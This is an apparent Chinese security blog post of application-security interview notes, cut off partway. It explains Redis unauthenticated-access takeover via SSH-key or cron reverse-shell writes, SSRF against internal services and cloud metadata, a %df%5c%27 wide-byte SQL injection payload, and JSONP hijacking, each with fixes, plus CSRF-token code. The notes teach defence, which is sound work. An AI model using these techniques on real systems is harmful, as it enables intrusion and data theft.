<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="应用安全岗位 Redis 未授权访问漏洞如何入侵利用？漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 &#x2F;root&#x2F;.ssh&#x2F;，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：">
<meta property="og:type" content="article">
<meta property="og:title" content="【工作】面试题整理 应用安全等">
<meta property="og:url" content="https://godreams.cn/2024/03/03/work/workpre1/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="应用安全岗位 Redis 未授权访问漏洞如何入侵利用？漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 &#x2F;root&#x2F;.ssh&#x2F;，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-03-03T12:15:58.000Z">
<meta property="article:modified_time" content="2025-03-04T07:54:53.671Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="null">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【工作】面试题整理 应用安全等</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/09/10/PaperReading/Auto-Login/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/03/work/workpre1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/03/work/workpre1/&text=【工作】面试题整理 应用安全等"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/03/work/workpre1/&is_video=false&description=【工作】面试题整理 应用安全等"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 应用安全等&body=Check out this article: https://godreams.cn/2024/03/03/work/workpre1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/03/work/workpre1/&name=【工作】面试题整理 应用安全等&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/03/work/workpre1/&t=【工作】面试题整理 应用安全等"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B2%97%E4%BD%8D"><span class="toc-number">1.</span> <span class="toc-text">应用安全岗位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Redis 未授权访问漏洞如何入侵利用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ARedis-%E9%BB%98%E8%AE%A4%E7%9B%91%E5%90%AC%E5%9C%A8-6379-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E8%8B%A5%E6%9C%AA%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%E6%88%96%E7%BB%91%E5%AE%9A%E7%89%B9%E5%AE%9A-IP%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%86%99%E5%85%A5-SSH-%E5%85%AC%E9%92%A5%EF%BC%9A%E5%88%A9%E7%94%A8-CONFIG-SET-%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%8C%81%E4%B9%85%E5%8C%96%E7%9B%AE%E5%BD%95%E4%B8%BA-root-ssh-%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-authorized-keys%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8-SET-%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%8C%E6%9C%80%E7%BB%88%E9%80%9A%E8%BF%87-SSH-%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82-%E5%8F%8D%E5%BC%B9-Shell%EF%BC%9A%E9%80%9A%E8%BF%87-CONFIG-SET-%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9%E6%8C%81%E4%B9%85%E5%8C%96%E7%9B%AE%E5%BD%95%E4%B8%BA-var-spool-cron-%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-root%EF%BC%8C%E5%86%85%E5%AE%B9%E4%B8%BA%E5%8F%8D%E5%90%91-shell-%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BF%9D%E5%AD%98%E5%90%8E%E8%A7%A6%E5%8F%91%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B-shell%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E9%85%8D%E7%BD%AE-requirepass-%EF%BC%8C%E5%90%AF%E7%94%A8%E5%AF%86%E7%A0%81%E8%AE%A4%E8%AF%81%E3%80%82-%E7%BB%91%E5%AE%9A-IP%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E9%85%8D%E7%BD%AE-bind-127-0-0-1%EF%BC%8C%E9%99%90%E5%88%B6%E4%BB%85%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE%E3%80%82-%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9-6379-%E7%AB%AF%E5%8F%A3%E7%9A%84%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%AF%E4%BF%A1-IP%E3%80%82-%E7%A6%81%E7%94%A8%E5%8D%B1%E9%99%A9%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E4%BD%BF%E7%94%A8-rename-command-%E7%A6%81%E7%94%A8%E6%88%96%E9%87%8D%E5%91%BD%E5%90%8D%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%A6%82-CONFIG%E3%80%81FLUSHDB-%E7%AD%89%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 &#x2F;root&#x2F;.ssh&#x2F;，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：通过 CONFIG SET 命令修改持久化目录为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;，文件名为 root，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。修复方案：- 设置密码：在 redis.conf 中配置 requirepass &lt;password&gt;，启用密码认证。- 绑定 IP：在 redis.conf 中配置 bind 127.0.0.1，限制仅本地访问。- 防火墙限制：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。- 禁用危险命令：在 redis.conf 中使用 rename-command 禁用或重命名高危命令，如 CONFIG、FLUSHDB 等。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9FJava-%E5%92%8C-PHP-%E7%9A%84-SSRF-%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ASSRF%EF%BC%88Server-Side-Request-Forgery%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%94%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E8%B5%B7%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AE%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%A6%82-http-127-0-0-1-5000-admin%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82%EE%88%86-%E6%8E%A2%E6%B5%8B%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%EF%BC%9A%E8%AE%BF%E9%97%AE%E4%BA%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%85%83%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%A6%82-AWS-%E7%9A%84-http-169-254-169-254-latest-meta-data-%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%AE%9E%E4%BE%8B%E4%BF%A1%E6%81%AF%E3%80%82-%E5%8F%8D%E5%BC%B9-Shell%EF%BC%9A%E5%88%A9%E7%94%A8%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%A6%82-gopher%EF%BC%89%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%BB%E6%9C%BA%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B-shell%E3%80%82%EE%88%86Java-%E5%92%8C-PHP-%E7%9A%84-SSRF-%E5%8C%BA%E5%88%AB%EF%BC%9A-Java%EF%BC%9AHttpURLConnection%E3%80%81Apache-HttpClient-%E7%AD%89%E7%B1%BB%E9%BB%98%E8%AE%A4%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE%EF%BC%8C%E5%8F%AF%E8%83%BD%E8%A2%AB%E7%94%A8%E4%BA%8E-SSRF-%E6%94%BB%E5%87%BB%E3%80%82Java%E9%80%9A%E5%B8%B8%E4%BD%BF%E7%94%A8%E5%A6%82HttpClient%E7%AD%89%E5%BA%93%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%E5%BA%93%E7%9A%84%E9%85%8D%E7%BD%AE%E4%BB%A5%E9%81%BF%E5%85%8DSSRF%E6%BC%8F%E6%B4%9E%E3%80%82-PHP%EF%BC%9Afile-get-contents%E3%80%81cURL-%E7%AD%89%E5%87%BD%E6%95%B0%E5%8F%AF%E7%94%A8%E4%BA%8E%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%9C%80%E6%B3%A8%E6%84%8F%E5%8D%8F%E8%AE%AE%E9%99%90%E5%88%B6%E3%80%82%EE%88%86%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%8D%8F%E8%AE%AE%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%9A%E9%99%90%E5%88%B6%E8%AF%B7%E6%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8-HTTP-%E5%92%8C-HTTPS%E3%80%82-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84-URL%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%9D%9E%E6%B3%95%E8%AF%B7%E6%B1%82%E3%80%82-%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E3%80%82-%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE%E9%98%B2%E6%8A%A4%EF%BC%9A%E5%9C%A8%E4%BA%91%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9%E5%85%83%E6%95%B0%E6%8D%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E3%80%82"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：- 访问内网服务：通过构造请求访问内部服务，如 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;admin，获取敏感信息。- 探测元数据服务：访问云服务的元数据接口，如 AWS 的 http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;，获取实例信息。- 反弹 Shell：利用支持的协议（如 gopher）构造请求，反向连接攻击者主机，获取远程 shell。Java 和 PHP 的 SSRF 区别：- Java：HttpURLConnection、Apache HttpClient 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。- PHP：file_get_contents、cURL 等函数可用于发起请求，需注意协议限制。修复方案：- 协议白名单：限制请求协议，仅允许 HTTP 和 HTTPS。- 输入验证：严格验证用户输入的 URL，防止非法请求。- 防火墙限制：使用防火墙规则限制对内部服务的访问。- 云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">宽字节注入漏洞原理、利用方式及修复方案？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%A4%9A%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%EF%BC%88%E5%A6%82-GBK%EF%BC%89%E7%89%B9%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8D%95%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%AF%BC%E8%87%B4-SQL-%E6%B3%A8%E5%85%A5%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%EF%BC%9A%E5%9C%A8-GBK-%E7%BC%96%E7%A0%81%E4%B8%8B%EF%BC%8C-df-5c-27-%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA-%EF%BC%8C%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%8C%E5%AF%BC%E8%87%B4-SQL-%E6%B3%A8%E5%85%A5%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%BB%9F%E4%B8%80%E7%BC%96%E7%A0%81%EF%BC%9A%E4%BD%BF%E7%94%A8-UTF-8-%E7%BC%96%E7%A0%81%EF%BC%8C%E9%81%BF%E5%85%8D%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%82-%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5%EF%BC%8C%E9%81%BF%E5%85%8D%E7%9B%B4%E6%8E%A5%E6%8B%BC%E6%8E%A5-SQL%E3%80%82-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。利用方式：- 绕过过滤：在 GBK 编码下，%df%5c%27 被解析为 &#39;，绕过过滤器，导致 SQL 注入。修复方案：- 统一编码：使用 UTF-8 编码，避免宽字节注入。- 参数化查询：使用预编译语句，避免直接拼接 SQL。- 输入验证：严格验证用户输入，防止恶意字符。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-%E7%9A%84%E4%B8%9A%E5%8A%A1%E6%84%8F%E4%B9%89%E3%80%81JSONP-%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9F%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1-CSRF-Token%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP-%E7%9A%84%E4%B8%9A%E5%8A%A1%E6%84%8F%E4%B9%89%EF%BC%9AJSONP%EF%BC%88JSON-with-Padding%EF%BC%89%E6%98%AF%E4%B8%80%E7%A7%8D%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8A%80%E6%9C%AF%EF%BC%8C%E5%88%A9%E7%94%A8-%E6%A0%87%E7%AD%BE%E7%9A%84%E8%B7%A8%E5%9F%9F%E7%89%B9%E6%80%A7%EF%BC%8C%E5%85%81%E8%AE%B8%E7%BD%91%E9%A1%B5%E4%BB%8E%E5%85%B6%E4%BB%96%E5%9F%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82JSONP-%E5%8A%AB%E6%8C%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%8A%AB%E6%8C%81%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%88%A9%E7%94%A8-JSONP-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E8%B4%A6%E6%88%B7%E4%BD%99%E9%A2%9D%E3%80%81%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99%E7%AD%89%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8-JSONP%EF%BC%9A%E4%B8%8D%E4%BD%BF%E7%94%A8-JSONP%EF%BC%8C%E6%94%B9%E7%94%A8-CORS-%E7%AD%89%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E3%80%82-%E9%AA%8C%E8%AF%81%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%EF%BC%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%90%8D%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%A2%AB%E7%AF%A1%E6%94%B9%E3%80%82-%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%9A%E9%80%9A%E8%BF%87-HTTPS-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E3%80%82%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1-CSRF-Token%EF%BC%9A-%E7%94%9F%E6%88%90-Token%EF%BC%9A%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E7%9A%84-CSRF-Token%EF%BC%8C%E5%B9%B6%E4%B8%8E%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D%E5%85%B3%E8%81%94%E3%80%82-%E5%B5%8C%E5%85%A5-Token%EF%BC%9A%E5%9C%A8%E6%AF%8F%E4%B8%AA%E8%A1%A8%E5%8D%95%E4%B8%AD%E5%B5%8C%E5%85%A5%E8%AF%A5-Token%EF%BC%8C%E4%BD%9C%E4%B8%BA%E9%9A%90%E8%97%8F%E5%AD%97%E6%AE%B5%E3%80%82-%E9%AA%8C%E8%AF%81-Token%EF%BC%9A%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84-Token-%E6%98%AF%E5%90%A6%E4%B8%8E%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%E3%80%82-%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-%E7%94%9F%E6%88%90-Token%EF%BC%88PHP%EF%BC%89%EF%BC%9A-%E5%B5%8C%E5%85%A5-Token%EF%BC%88HTML%EF%BC%89%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">JSONP 的业务意义：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 &lt;script&gt; 标签的跨域特性，允许网页从其他域获取数据。JSONP 劫持利用方式：- 劫持敏感数据：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。修复方案：- 禁用 JSONP：不使用 JSONP，改用 CORS 等安全的跨域请求方式。- 验证回调函数：严格验证回调函数名，防止被篡改。- 使用 HTTPS：通过 HTTPS 加密传输，防止中间人攻击。如何设计 CSRF Token：- 生成 Token：在服务器端生成随机的 CSRF Token，并与用户会话关联。- 嵌入 Token：在每个表单中嵌入该 Token，作为隐藏字段。- 验证 Token：在服务器端验证请求中的 Token 是否与会话中的一致。- 示例代码：  - 生成 Token（PHP）：    1234session_start();if (empty($_SESSION[&#39;csrf_token&#39;])) {    $_SESSION[&#39;csrf_token&#39;] &#x3D; bin2hex(random_bytes(32));}  - 嵌入 Token（HTML）：    1234&lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;&#x2F;submit&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;csrf_token&quot; value&#x3D;&quot;&lt;?php echo $_SESSION[&#39;csrf_token&#39;]; ?&gt;&quot;&gt;    &lt;!-- 其他表单字段 --&gt;&lt;&#x2F;form </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%8E%9F%E7%90%86%E3%80%81%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">CORS 